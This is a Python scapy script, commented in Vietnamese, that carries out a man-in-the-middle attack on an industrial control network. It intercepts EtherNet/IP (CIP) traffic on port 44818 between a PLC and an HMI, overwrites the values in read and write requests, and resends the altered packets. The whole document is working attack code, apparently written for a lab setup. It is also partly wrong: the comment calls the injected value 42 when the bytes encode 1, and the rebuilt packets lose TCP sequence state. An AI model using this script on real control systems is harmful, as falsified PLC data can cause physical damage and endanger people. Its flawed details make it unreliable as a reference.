#!/usr/bin/python3
from scapy.all import *
import struct

# Cấu hình mạng
IP_CONFIG = {
    'plc1': '192.168.1.10',
    'hmi': '192.168.1.20',
    'attacker': '192.168.1.77',
}
MAC_CONFIG = {
    'plc1': '00:1D:9C:C7:B0:10',
    'hmi': '00:1D:9C:C8:BC:20',
    'attacker': 'AA:AA:AA:AA:AA:AA',
}

# Thay đổi dữ liệu CIP
def modify_cip_payload(data):
    if len(data) > 4:
        service = data[0]  # CIP Service
        if service in [0x4c, 0x0e]:  # Chỉ sửa các service cụ thể
            print(f"[*] Modifying CIP service: {service}")
            # Thay đổi dữ liệu, ví dụ: Giá trị INT
            new_data = b'\x01\x00'  # Giá trị INT = 42
            return data[:4] + new_data + data[6:]
    return data

# Xử lý gói tin
def spoof_pkt(pkt):
    if pkt.haslayer(IP) :
        if pkt[TCP].dport == 44818 or pkt[TCP].sport == 44818:
            # Phân tích payload
            data = bytes(pkt[TCP].payload)
            if len(data) > 4:
                print("[*] CIP packet detected!")
                # Thay đổi payload CIP
                new_data = modify_cip_payload(data)
                # Tạo gói tin mới
                newpkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / \
                         TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags=pkt[TCP].flags) / \
                         new_data
                send(newpkt)
        else:
            # Forward các gói tin khác
            send(pkt)
    else:
        send(pkt)

# Lọc và chặn gói tin 
pkt = sniff(iface='attacker-eth0', prn=spoof_pkt)
